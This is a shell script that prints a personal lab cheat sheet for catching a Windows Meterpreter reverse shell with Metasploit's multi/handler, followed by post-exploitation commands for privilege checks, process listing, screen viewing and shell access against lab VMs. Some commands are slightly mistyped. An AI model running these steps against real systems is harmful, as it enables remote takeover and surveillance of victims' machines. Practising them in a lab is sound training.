echo '
--] METERPRETER 36

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OPERATOR
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> jobs
OPERATOR    ==> TASK ==> jobs -K
OPERATOR    ==> TASK ==> exploit -j
OPERATOR    ==> TASK ==> session -i 2 or session -i 1
OPERATOR    ==> TASK ==> getuid
OPERATOR    ==> TASK ==> getprivs
OPERATOR    ==> TASK ==> netstat
OPERATOR    ==> TASK ==> ipconfig
OPERATOR    ==> TASK ==> sysinfo
OPERATOR    ==> TASK ==> ps
OPERATOR    ==> TASK ==> idletime
OPERATOR    ==> TASK ==> screenshare
OPERATOR    ==> TASK ==> shell
OPERATOR    ==> TASK ==> get all info 
OPERATOR    ==> TASK ==> exit

'
read